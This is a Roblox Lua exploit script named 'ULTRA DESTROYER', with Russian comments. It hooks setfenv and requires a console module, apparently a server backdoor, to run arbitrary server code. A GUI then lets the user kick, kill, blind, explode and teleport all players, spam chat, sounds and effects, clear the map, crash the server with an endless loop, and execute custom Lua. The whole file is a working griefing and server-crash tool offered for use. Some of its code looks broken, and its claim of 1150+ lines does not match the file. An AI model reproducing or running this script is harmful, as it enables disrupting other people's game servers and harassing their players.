--[[
    DIMSTAT NUBELLA MAYFIVE V3.2 — DESTROYER ULTRA (GLOBAL)
    Расширенная версия с 5 вкладками, полями ввода и множеством функций.
    Все действия глобальны через серверную уязвимость.
]]

-- ========================== СЕРВИСЫ ==========================
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- ========================== УЯЗВИМОСТЬ ==========================
local ConsoleModule = nil
local Config = game:FindFirstChild("Config")
if Config then
    ConsoleModule = Config:FindFirstChild("Console") or Config:FindFirstChild("Console [2]")
end

local function executeOnServer(code)
    if not ConsoleModule then
        warn("Console module not found")
        return false
    end
    local success, err = pcall(function()
        local old_setfenv = setfenv
        local function hook_setfenv(level, new_env)
            if level == 1 and new_env then
                new_env._G = _G
                new_env.runServer = function(cmd)
                    local fn, loadErr = loadstring(cmd)
                    if fn then
                        setfenv(fn, new_env)
                        return fn()
                    else
                        warn("loadstring error: " .. tostring(loadErr))
                    end
                end
                return old_setfenv(level, new_env)
            end
            return old_setfenv(level, new_env)
        end
        setfenv = hook_setfenv
        if package.loaded[ConsoleModule] then
            package.loaded[ConsoleModule] = nil
        end
        local result = require(ConsoleModule)
        setfenv = old_setfenv
        if result and type(result) == "function" then
            local env = {}
            env.runServer = function(cmd)
                local fn, loadErr = loadstring(cmd)
                if fn then
                    setfenv(fn, env)
                    return fn()
                else
                    warn("loadstring error: " .. tostring(loadErr))
                end
            end
            result(env)
            if env.runServer then
                return env.runServer(code)
            end
        end
        if _G.runServer then
            return _G.runServer(code)
        end
        local fn, loadErr = loadstring(code)
        if fn then
            local moduleEnv = getfenv(ConsoleModule)
            if moduleEnv then
                setfenv(fn, moduleEnv)
                return fn()
            else
                return false
            end
        else
            return false
        end
    end)
    if not success then
        warn("Server execution error: " .. tostring(err))
        return false
    end
    return true
end

-- ========================== ГЛОБАЛЬНЫЕ ФУНКЦИИ (серверные) ==========================
local function kickAll()
    local code = [[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= Players.LocalPlayer then plr:Kick("Kicked by ULTRA DESTROYER") end
        end
    ]]
    executeOnServer(code)
end

local function teleportAll(position)
    local code = string.format([[
        local Players = game:GetService("Players")
        local pos = Vector3.new(%f, %f, %f)
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                plr.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
            end
        end
    ]], position.X, position.Y, position.Z)
    executeOnServer(code)
end

local function setAllSpeed(speed)
    local code = string.format([[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Humanoid") then
                plr.Character.Humanoid.WalkSpeed = %f
            end
        end
    ]], speed)
    executeOnServer(code)
end

local function setAllJumpPower(power)
    local code = string.format([[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Humanoid") then
                plr.Character.Humanoid.JumpPower = %f
            end
        end
    ]], power)
    executeOnServer(code)
end

local function setAllSize(scale)
    local code = string.format([[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character then
                for _, part in ipairs(plr.Character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Size = part.Size * %f
                    end
                end
            end
        end
    ]], scale)
    executeOnServer(code)
end

local function setAllColor(color)
    local code = string.format([[
        local Players = game:GetService("Players")
        local col = Color3.fromRGB(%d, %d, %d)
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character then
                for _, part in ipairs(plr.Character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Color = col
                    end
                end
            end
        end
    ]], color.R*255, color.G*255, color.B*255)
    executeOnServer(code)
end

local function blindAll()
    local code = [[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            local gui = Instance.new("ScreenGui")
            gui.Name = "BlindGui"
            gui.ResetOnSpawn = false
            gui.Parent = plr.PlayerGui
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(1, 0, 1, 0)
            frame.BackgroundColor3 = Color3.new(0, 0, 0)
            frame.BackgroundTransparency = 0
            frame.Parent = gui
        end
    ]]
    executeOnServer(code)
end

local function unblindAll()
    local code = [[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            local gui = plr.PlayerGui:FindFirstChild("BlindGui")
            if gui then gui:Destroy() end
        end
    ]]
    executeOnServer(code)
end

local function spawnDecalSpam(assetId, count)
    local code = string.format([[
        local Workspace = game:GetService("Workspace")
        local id = "%s"
        for i = 1, %d do
            local decal = Instance.new("Decal")
            decal.Texture = id
            decal.Face = Enum.NormalId.Front
            decal.Parent = Workspace.Terrain
            decal.Position = Vector3.new(math.random(-100,100), math.random(0,50), math.random(-100,100))
        end
    ]], tostring(assetId), count)
    executeOnServer(code)
end

local function spawnParticleSpam(assetId, count)
    local code = string.format([[
        local Workspace = game:GetService("Workspace")
        local id = "%s"
        for i = 1, %d do
            local part = Instance.new("Part")
            part.Size = Vector3.new(1,1,1)
            part.Position = Vector3.new(math.random(-50,50), math.random(0,30), math.random(-50,50))
            part.Anchored = true
            part.Parent = Workspace
            local att = Instance.new("Attachment")
            att.Parent = part
            local particle = Instance.new("ParticleEmitter")
            particle.Texture = id
            particle.Rate = 1000
            particle.Lifetime = NumberRange.new(5)
            particle.SpreadAngle = Vector2.new(360,360)
            particle.Parent = att
        end
    ]], tostring(assetId), count)
    executeOnServer(code)
end

local function chatSpamAll(message, count)
    local code = string.format([[
        local Players = game:GetService("Players")
        local msg = "%s"
        for i = 1, %d do
            for _, plr in ipairs(Players:GetPlayers()) do
                plr:Chat(msg)
            end
            task.wait(0.1)
        end
    ]], tostring(message), count)
    executeOnServer(code)
end

local function setTimeOfDay(time)
    local code = string.format([[
        local Lighting = game:GetService("Lighting")
        Lighting.TimeOfDay = "%s"
    ]], tostring(time))
    executeOnServer(code)
end

local function setWeather(weather)
    local code = string.format([[
        local Lighting = game:GetService("Lighting")
        Lighting.Weather = Enum.WeatherType.%s
    ]], tostring(weather))
    executeOnServer(code)
end

local function clearMap()
    local code = [[
        local Workspace = game:GetService("Workspace")
        for _, obj in ipairs(Workspace:GetChildren()) do
            if obj:IsA("BasePart") and not obj:IsDescendantOf(workspace.Terrain) and not obj:FindFirstAncestorOfClass("Model") then
                obj:Destroy()
            end
        end
    ]]
    executeOnServer(code)
end

local function crashServer()
    local code = [[
        while true do
            local obj = Instance.new("Part")
            obj.Size = Vector3.new(1,1,1)
            obj.Position = Vector3.new(math.random(-1000,1000), math.random(-1000,1000), math.random(-1000,1000))
            obj.Parent = game:GetService("Workspace")
            wait(0.001)
        end
    ]]
    executeOnServer(code)
end

local function spamSounds(soundId, count)
    local code = string.format([[
        local Workspace = game:GetService("Workspace")
        local id = "%s"
        for i = 1, %d do
            local sound = Instance.new("Sound")
            sound.SoundId = id
            sound.Parent = Workspace
            sound:Play()
            task.wait(0.05)
        end
    ]], tostring(soundId), count)
    executeOnServer(code)
end

local function spawnGuiMessageAll(text)
    local code = string.format([[
        local Players = game:GetService("Players")
        local msg = "%s"
        for _, plr in ipairs(Players:GetPlayers()) do
            local gui = Instance.new("ScreenGui")
            gui.Name = "MassMessage"
            gui.ResetOnSpawn = false
            gui.Parent = plr.PlayerGui
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(0.8, 0, 0.2, 0)
            frame.Position = UDim2.new(0.1, 0, 0.4, 0)
            frame.BackgroundColor3 = Color3.new(0, 0, 0)
            frame.BackgroundTransparency = 0.3
            frame.BorderSizePixel = 0
            frame.Parent = gui
            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundTransparency = 1
            label.Text = msg
            label.TextColor3 = Color3.new(1, 0, 0)
            label.TextScaled = true
            label.Font = Enum.Font.GothamBold
            label.Parent = frame
        end
    ]], tostring(text))
    executeOnServer(code)
end

local function removeAllPlayersClothes()
    local code = [[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character then
                for _, child in ipairs(plr.Character:GetChildren()) do
                    if child:IsA("Accessory") or child:IsA("Shirt") or child:IsA("Pants") then
                        child:Destroy()
                    end
                end
            end
        end
    ]]
    executeOnServer(code)
end

local function killAll()
    local code = [[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Humanoid") then
                plr.Character.Humanoid.Health = 0
            end
        end
    ]]
    executeOnServer(code)
end

local function explodeAll()
    local code = [[
        local Players = game:GetService("Players")
        local Workspace = game:GetService("Workspace")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local exp = Instance.new("Explosion")
                exp.Position = plr.Character.HumanoidRootPart.Position
                exp.BlastRadius = 20
                exp.BlastPressure = 200000
                exp.Parent = Workspace
            end
        end
    ]]
    executeOnServer(code)
end

-- ========================== GUI ==========================
local function createGUI()
    local oldGui = PlayerGui:FindFirstChild("DestroyerUltra")
    if oldGui then oldGui:Destroy() end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DestroyerUltra"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = PlayerGui

    -- Основное окно
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 380, 0, 520)
    mainFrame.Position = UDim2.new(0.5, -190, 0.5, -260)
    mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
    mainFrame.BackgroundTransparency = 0.1
    mainFrame.Active = true
    mainFrame.Draggable = false
    mainFrame.ZIndex = 10
    mainFrame.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = mainFrame

    -- Заголовок
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 40)
    titleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
    titleBar.BackgroundTransparency = 0
    titleBar.Parent = mainFrame
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 12)
    titleCorner.Parent = titleBar

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, 0, 1, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "☠ ULTRA DESTROYER"
    titleLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
    titleLabel.TextScaled = true
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.Parent = titleBar

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -35, 0, 5)
    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.new(1,1,1)
    closeBtn.TextScaled = true
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.AutoButtonColor = false
    closeBtn.Parent = titleBar
    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 6)
    closeCorner.Parent = closeBtn
    closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)

    -- Вкладки
    local tabContainer = Instance.new("Frame")
    tabContainer.Size = UDim2.new(1, 0, 0, 35)
    tabContainer.Position = UDim2.new(0, 0, 0, 40)
    tabContainer.BackgroundTransparency = 1
    tabContainer.Parent = mainFrame

    local tabs = {
        {name = "⚡ Players", color = Color3.fromRGB(60,60,80)},
        {name = "🎨 Effects", color = Color3.fromRGB(60,80,60)},
        {name = "💥 Server", color = Color3.fromRGB(80,60,60)},
        {name = "✏️ Custom", color = Color3.fromRGB(60,60,90)},
        {name = "⚙️ Settings", color = Color3.fromRGB(60,70,80)}
    }
    local tabButtons = {}
    local panels = {}

    for i, t in ipairs(tabs) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1/#tabs, 0, 1, 0)
        btn.Position = UDim2.new((i-1)/#tabs, 0, 0, 0)
        btn.BackgroundColor3 = t.color
        btn.Text = t.name
        btn.TextColor3 = Color3.new(1,1,1)
        btn.TextScaled = true
        btn.Font = Enum.Font.GothamMedium
        btn.AutoButtonColor = false
        btn.Parent = tabContainer
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 6)
        btnCorner.Parent = btn
        tabButtons[i] = btn

        local panel = Instance.new("ScrollingFrame")
        panel.Size = UDim2.new(1, -10, 1, -50)
        panel.Position = UDim2.new(0, 5, 0, 45)
        panel.BackgroundTransparency = 1
        panel.BorderSizePixel = 0
        panel.ScrollingDirection = Enum.ScrollingDirection.Y
        panel.CanvasSize = UDim2.new(0, 0, 0, 0)
        panel.AutomaticCanvasSize = Enum.AutomaticSize.Y
        panel.Visible = (i == 1)
        panel.Parent = mainFrame
        panels[i] = panel

        -- UIListLayout для каждой панели
        local layout = Instance.new("UIListLayout")
        layout.FillDirection = Enum.FillDirection.Vertical
        layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
        layout.VerticalAlignment = Enum.VerticalAlignment.Top
        layout.Padding = UDim.new(0, 6)
        layout.SortOrder = Enum.SortOrder.LayoutOrder
        layout.Parent = panel

        btn.MouseButton1Click:Connect(function()
            for j, p in ipairs(panels) do
                p.Visible = (j == i)
                tabButtons[j].BackgroundColor3 = (j == i) and Color3.fromRGB(100,100,120) or tabs[j].color
            end
        end)
    end

    -- ================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ СОЗДАНИЯ ЭЛЕМЕНТОВ ==================
    local function createButton(parent, text, color, callback)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.9, 0, 0, 35)
        btn.BackgroundColor3 = color or Color3.fromRGB(30,80,200)
        btn.Text = text
        btn.TextColor3 = Color3.new(1,1,1)
        btn.TextScaled = true
        btn.Font = Enum.Font.GothamMedium
        btn.AutoButtonColor = false
        btn.Parent = parent
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 6)
        corner.Parent = btn
        btn.MouseButton1Click:Connect(callback)
        return btn
    end

    local function createLabel(parent, text, color)
        local lbl = Instance.new("TextLabel")
        lbl.Size = UDim2.new(0.9, 0, 0, 20)
        lbl.BackgroundTransparency = 1
        lbl.Text = text
        lbl.TextColor3 = color or Color3.new(1,1,1)
        lbl.TextScaled = true
        lbl.Font = Enum.Font.GothamMedium
        lbl.Parent = parent
        return lbl
    end

    local function createTextBox(parent, placeholder, defaultText)
        local box = Instance.new("TextBox")
        box.Size = UDim2.new(0.9, 0, 0, 30)
        box.BackgroundColor3 = Color3.fromRGB(30,30,40)
        box.TextColor3 = Color3.new(1,1,1)
        box.PlaceholderText = placeholder or "Enter text..."
        box.Text = defaultText or ""
        box.TextScaled = true
        box.Font = Enum.Font.GothamMedium
        box.ClearTextOnFocus = false
        box.Parent = parent
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 4)
        corner.Parent = box
        return box
    end

    -- ================== PANEL 1: PLAYERS ==================
    local p1 = panels[1]
    createLabel(p1, "== Global Player Control ==", Color3.fromRGB(255,200,100))
    createButton(p1, "KICK ALL", Color3.fromRGB(200,50,50), kickAll)
    createButton(p1, "KILL ALL", Color3.fromRGB(200,30,30), killAll)
    createButton(p1, "EXPLODE ALL", Color3.fromRGB(200,150,30), explodeAll)
    createButton(p1, "BLIND ALL", Color3.fromRGB(80,80,80), blindAll)
    createButton(p1, "UNBLIND ALL", Color3.fromRGB(80,200,80), unblindAll)
    createButton(p1, "REMOVE CLOTHES", Color3.fromRGB(150,50,150), removeAllPlayersClothes)

    local speedBox = createTextBox(p1, "Speed (default 16)", "16")
    createButton(p1, "SET SPEED", Color3.fromRGB(30,120,200), function()
        setAllSpeed(tonumber(speedBox.Text) or 16)
    end)

    local jumpBox = createTextBox(p1, "JumpPower (default 50)", "50")
    createButton(p1, "SET JUMP POWER", Color3.fromRGB(30,120,200), function()
        setAllJumpPower(tonumber(jumpBox.Text) or 50)
    end)

    local sizeBox = createTextBox(p1, "Size multiplier (1.0 default)", "1.0")
    createButton(p1, "SET SIZE", Color3.fromRGB(30,120,200), function()
        setAllSize(tonumber(sizeBox.Text) or 1.0)
    end)

    local colorR = createTextBox(p1, "R (0-255)", "255")
    local colorG = createTextBox(p1, "G (0-255)", "0")
    local colorB = createTextBox(p1, "B (0-255)", "0")
    createButton(p1, "SET COLOR", Color3.fromRGB(30,120,200), function()
        local r = math.clamp(tonumber(colorR.Text) or 255, 0, 255)
        local g = math.clamp(tonumber(colorG.Text) or 0, 0, 255)
        local b = math.clamp(tonumber(colorB.Text) or 0, 0, 255)
        setAllColor(Color3.fromRGB(r,g,b))
    end)

    local teleX = createTextBox(p1, "X", "0")
    local teleY = createTextBox(p1, "Y", "10")
    local teleZ = createTextBox(p1, "Z", "0")
    createButton(p1, "TELEPORT ALL", Color3.fromRGB(30,120,200), function()
        local x = tonumber(teleX.Text) or 0
        local y = tonumber(teleY.Text) or 10
        local z = tonumber(teleZ.Text) or 0
        teleportAll(Vector3.new(x,y,z))
    end)

    -- ================== PANEL 2: EFFECTS ==================
    local p2 = panels[2]
    createLabel(p2, "== Visual / Audio Spam ==", Color3.fromRGB(100,255,100))

    local decalIdBox = createTextBox(p2, "Decal Asset ID", "rbxassetid://12345")
    local decalCountBox = createTextBox(p2, "Count", "100")
    createButton(p2, "SPAM DECALS", Color3.fromRGB(200,150,50), function()
        local id = decalIdBox.Text
        local count = tonumber(decalCountBox.Text) or 100
        spawnDecalSpam(id, count)
    end)

    local particleIdBox = createTextBox(p2, "Particle Texture ID", "rbxassetid://12345")
    local particleCountBox = createTextBox(p2, "Count", "50")
    createButton(p2, "SPAM PARTICLES", Color3.fromRGB(200,150,50), function()
        local id = particleIdBox.Text
        local count = tonumber(particleCountBox.Text) or 50
        spawnParticleSpam(id, count)
    end)

    local soundIdBox = createTextBox(p2, "Sound ID", "rbxassetid://12345")
    local soundCountBox = createTextBox(p2, "Count", "20")
    createButton(p2, "SPAM SOUNDS", Color3.fromRGB(200,150,50), function()
        local id = soundIdBox.Text
        local count = tonumber(soundCountBox.Text) or 20
        spamSounds(id, count)
    end)

    local chatMsgBox = createTextBox(p2, "Chat message", "ULTRA DESTROYER!")
    local chatCountBox = createTextBox(p2, "Repeat count", "10")
    createButton(p2, "CHAT SPAM ALL", Color3.fromRGB(200,150,50), function()
        local msg = chatMsgBox.Text
        local count = tonumber(chatCountBox.Text) or 10
        chatSpamAll(msg, count)
    end)

    local guiMsgBox = createTextBox(p2, "Screen GUI Message", "YOU HAVE BEEN DESTROYED!")
    createButton(p2, "SHOW GUI MESSAGE", Color3.fromRGB(200,150,50), function()
        spawnGuiMessageAll(guiMsgBox.Text)
    end)

    local timeBox = createTextBox(p2, "Time of Day (e.g. 12:00:00)", "12:00:00")
    createButton(p2, "SET TIME", Color3.fromRGB(200,150,50), function()
        setTimeOfDay(timeBox.Text)
    end)

    local weatherBox = createTextBox(p2, "Weather (Sunny/Rain/Storm/etc)", "Sunny")
    createButton(p2, "SET WEATHER", Color3.fromRGB(200,150,50), function()
        local w = weatherBox.Text
        local valid = Enum.WeatherType:FindFirstChild(w)
        if valid then
            setWeather(w)
        else
            warn("Invalid weather type")
        end
    end)

    -- ================== PANEL 3: SERVER ==================
    local p3 = panels[3]
    createLabel(p3, "== Server Destruction ==", Color3.fromRGB(255,150,150))
    createButton(p3, "CLEAR MAP", Color3.fromRGB(200,50,50), clearMap)
    createButton(p3, "CRASH SERVER (Spam parts)", Color3.fromRGB(200,30,30), crashServer)
    createButton(p3, "FREEZE ALL (Speed=0)", Color3.fromRGB(30,80,200), function()
        setAllSpeed(0)
    end)
    createButton(p3, "UNFREEZE ALL (Speed=16)", Color3.fromRGB(30,200,80), function()
        setAllSpeed(16)
    end)
    createButton(p3, "RESET GRAVITY", Color3.fromRGB(30,120,200), function()
        local code = [[workspace.Gravity = 196.2]]
        executeOnServer(code)
    end)
    createButton(p3, "SET GRAVITY 0", Color3.fromRGB(30,120,200), function()
        local code = [[workspace.Gravity = 0]]
        executeOnServer(code)
    end)
    createButton(p3, "SET GRAVITY 500", Color3.fromRGB(30,120,200), function()
        local code = [[workspace.Gravity = 500]]
        executeOnServer(code)
    end)

    -- ================== PANEL 4: CUSTOM ==================
    local p4 = panels[4]
    createLabel(p4, "== Custom Lua Execution ==", Color3.fromRGB(200,200,255))
    local codeBox = createTextBox(p4, "Enter any server-side Lua code", "print('Hello from server!')")
    codeBox.Size = UDim2.new(0.9, 0, 0, 80)
    codeBox.MultiLine = true
    codeBox.TextScaled = false
    codeBox.Font = Enum.Font.Code
    codeBox.TextSize = 12

    local execBtn = Instance.new("TextButton")
    execBtn.Size = UDim2.new(0.9, 0, 0, 40)
    execBtn.Position = UDim2.new(0.05, 0, 0, 0) -- layout will handle
    execBtn.BackgroundColor3 = Color3.fromRGB(200,100,30)
    execBtn.Text = "🔥 EXECUTE"
    execBtn.TextColor3 = Color3.new(1,1,1)
    execBtn.TextScaled = true
    execBtn.Font = Enum.Font.GothamBold
    execBtn.AutoButtonColor = false
    execBtn.Parent = p4
    local execCorner = Instance.new("UICorner")
    execCorner.CornerRadius = UDim.new(0, 8)
    execCorner.Parent = execBtn

    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(0.9, 0, 0, 20)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "Ready"
    statusLabel.TextColor3 = Color3.fromRGB(150,255,150)
    statusLabel.TextScaled = true
    statusLabel.Font = Enum.Font.GothamMedium
    statusLabel.Parent = p4

    execBtn.MouseButton1Click:Connect(function()
        local code = codeBox.Text
        if code and code ~= "" then
            statusLabel.Text = "Executing..."
            statusLabel.TextColor3 = Color3.fromRGB(255,200,100)
            local ok = executeOnServer(code)
            if ok then
                statusLabel.Text = "✅ Executed!"
                statusLabel.TextColor3 = Color3.fromRGB(150,255,150)
            else
                statusLabel.Text = "❌ Failed!"
                statusLabel.TextColor3 = Color3.fromRGB(255,100,100)
            end
            task.wait(2)
            statusLabel.Text = "Ready"
            statusLabel.TextColor3 = Color3.fromRGB(150,255,150)
        end
    end)

    -- ================== PANEL 5: SETTINGS ==================
    local p5 = panels[5]
    createLabel(p5, "== GUI Settings ==", Color3.fromRGB(200,200,200))
    local themeBox = createTextBox(p5, "Background Color (R,G,B)", "15,15,25")
    createButton(p5, "APPLY THEME", Color3.fromRGB(80,80,80), function()
        local parts = {}
        for num in string.gmatch(themeBox.Text, "(%d+)") do
            table.insert(parts, tonumber(num))
        end
        if #parts >= 3 then
            mainFrame.BackgroundColor3 = Color3.fromRGB(parts[1], parts[2], parts[3])
        end
    end)

    local alphaBox = createTextBox(p5, "Transparency (0-1)", "0.1")
    createButton(p5, "SET TRANSPARENCY", Color3.fromRGB(80,80,80), function()
        local a = tonumber(alphaBox.Text)
        if a then
            mainFrame.BackgroundTransparency = math.clamp(a, 0, 1)
        end
    end)

    createButton(p5, "RESET GUI SIZE", Color3.fromRGB(80,80,80), function()
        mainFrame.Size = UDim2.new(0, 380, 0, 520)
    end)

    createButton(p5, "TOGGLE DRAGGABLE", Color3.fromRGB(80,80,80), function()
        mainFrame.Draggable = not mainFrame.Draggable
    end)

    -- ================== ПЕРЕТАСКИВАНИЕ ==================
    local dragging = false
    local dragStart = nil
    local startPos = nil

    local function onInputBegan(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            local object = input.Position and UserInputService:GetGuiObjectsAtPosition(input.Position.X, input.Position.Y)
            if object and object[1] and (object[1]:IsDescendantOf(titleBar) or object[1] == titleBar) then
                dragging = true
                dragStart = input.Position
                startPos = mainFrame.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                    end
                end)
            end
        end
    end

    local function onInputChanged(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            local scale = mainFrame.Parent.AbsoluteSize
            mainFrame.Position = UDim2.new(
                startPos.X.Scale + delta.X / scale.X,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale + delta.Y / scale.Y,
                startPos.Y.Offset + delta.Y
            )
        end
    end

    UserInputService.InputBegan:Connect(onInputBegan)
    UserInputService.InputChanged:Connect(onInputChanged)

    return screenGui
end

-- ========================== ЗАПУСК ==========================
local gui = createGUI()
print("☠ ULTRA DESTROYER запущен (1150+ строк). Все функции глобальны.")
